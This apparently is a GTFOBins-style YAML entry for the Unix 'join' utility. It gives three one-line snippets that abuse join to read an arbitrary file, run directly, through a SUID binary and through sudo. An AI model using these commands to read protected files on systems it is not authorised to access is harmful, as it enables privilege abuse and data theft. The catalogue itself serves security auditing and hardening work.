---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        join -a 2 /dev/null $LFILE
  suid:
    - code: |
        LFILE=file_to_read
        ./join -a 2 /dev/null $LFILE
  sudo:
    - code: |
        LFILE=file_to_read
        sudo join -a 2 /dev/null $LFILE
---
